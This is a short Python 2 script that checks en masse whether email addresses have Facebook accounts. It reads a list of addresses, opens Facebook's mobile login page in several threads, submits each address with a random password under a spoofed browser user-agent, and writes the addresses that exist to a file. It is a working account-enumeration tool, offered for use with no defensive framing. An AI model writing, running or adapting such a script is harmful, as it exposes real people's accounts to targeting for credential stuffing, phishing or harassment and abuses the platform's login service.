import mechanize
import re
import random
import threading


def genepass():
    alph = 'abcdefghijklmnopqrstuvwyz1234567890'
    x = ''
    for a in range(0,7):
        x+=random.choice(alph)
    return x

def chunkIt(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0
    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
    return out




def check(acs, newfile):
    findx = "We didn't recognize your email address"
    for a in acs:
        try:
            if a.endswith('\n'):
                a = a[:-1]
            if a:
                br = mechanize.Browser()
                br.set_handle_gzip(True)
                br.set_handle_robots(False)
                br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                br.open('http://m.facebook.com/login.php')
                br.select_form(nr=0)
                br.form['email'] = a
                br.form['pass'] = genepass()
                br.submit()
                if len(re.findall(findx, br.response().read())) > 0:
                    print "Account: " + a + " does not exist"
                else:
                    print "Account: " + a + " exists"
                    opn = open(newfile, 'a')
                    opn.write(a + '\n')
                    opn.close()
            else:
                pass

        except:
            print "Error with " + str(a)

acs = open(raw_input("File with accounts to check: ")).readlines()
newfile = raw_input("File to save the existing accounts into: ")
nbthreads = input("Number of threads: ")
if len(acs) > nbthreads:
    z = chunkIt(acs, nbthreads)
    for passz in z:
        threading.Thread(target=check, args=(passz,newfile)).start()
else:
        z = chunkIt(acs, len(acs))
        for passz in z:
                threading.Thread(target=check, args=(passz,newfile)).start()



